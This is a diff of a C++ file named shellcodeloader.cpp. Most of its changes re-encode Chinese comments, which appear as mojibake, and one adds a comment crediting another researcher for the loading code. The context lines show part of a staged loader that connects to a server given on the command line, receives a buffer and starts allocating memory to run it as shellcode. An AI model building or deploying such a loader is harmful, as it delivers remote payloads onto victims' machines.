@@ -1,4 +1,4 @@
-// shellcodeloader.cpp : ¶¨Òå¿ØÖÆÌ¨Ó¦ÓÃ³ÌĞòµÄÈë¿Úµã¡£
+// shellcodeloader.cpp : å®šä¹‰æ§åˆ¶å°åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚
 //
 
 #include "stdafx.h"
@@ -18,9 +18,9 @@ int main(int argc, char *argv[])
 	SOCKADDR_IN servAddr;
 	char buf[BUF_SIZE];
 	char bufRecv[BUF_SIZE];
-	DWORD dwThreadId; // Ïß³ÌID
-	HANDLE hThread; // Ïß³Ì¾ä±ú
-	DWORD dwOldProtect; // ÄÚ´æÒ³ÊôĞÔ
+	DWORD dwThreadId; // çº¿ç¨‹ID
+	HANDLE hThread; // çº¿ç¨‹å¥æŸ„
+	DWORD dwOldProtect; // å†…å­˜é¡µå±æ€§
 	int retVal; 
 	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)
 	{
@@ -35,24 +35,24 @@ int main(int argc, char *argv[])
 		return  -1;
 	}
 
-	//ÉèÖÃ·şÎñÆ÷µØÖ·
+	//è®¾ç½®æœåŠ¡å™¨åœ°å€
 	servAddr.sin_family = AF_INET;
 	servAddr.sin_addr.s_addr = inet_addr(argv[1]);
 	servAddr.sin_port = htons((short)atoi(argv[2]));
 	
 
-	//Á¬½Ó·şÎñÆ÷
+	//è¿æ¥æœåŠ¡å™¨
 	retVal = connect(sHost, (LPSOCKADDR)&servAddr, sizeof(servAddr));
 	if (SOCKET_ERROR == retVal)
 	{
 		cout << "connect failed!" << endl;
-		closesocket(sHost); //¹Ø±ÕÌ×½Ó×Ö
-		WSACleanup(); //ÊÍ·ÅÌ×½Ó×Ö×ÊÔ´
+		closesocket(sHost); //å…³é—­å¥—æ¥å­—
+		WSACleanup(); //é‡Šæ”¾å¥—æ¥å­—èµ„æº
 		return -1;
 	}
 
 
-		//Ïò·şÎñÆ÷·¢ËÍÊı¾İ
+		//å‘æœåŠ¡å™¨å‘é€æ•°æ®
 	ZeroMemory(buf, BUF_SIZE);
 	strcpy(buf, "ok");
 	
@@ -76,6 +76,8 @@ int main(int argc, char *argv[])
 	WSACleanup();
 	
 	cout << "Start load" << endl;
+	
+	/*è¿™é‡Œè¿™éƒ¨åˆ†ç”¨çš„æ˜¯å€¾æ—‹å¤§è¡¨å“¥ç”¨åˆ°çš„åŠ è½½shellcodeçš„ä»£ç */
 	char * shellcode = (char *)VirtualAlloc(
 		NULL,
 		BUF_SIZE,
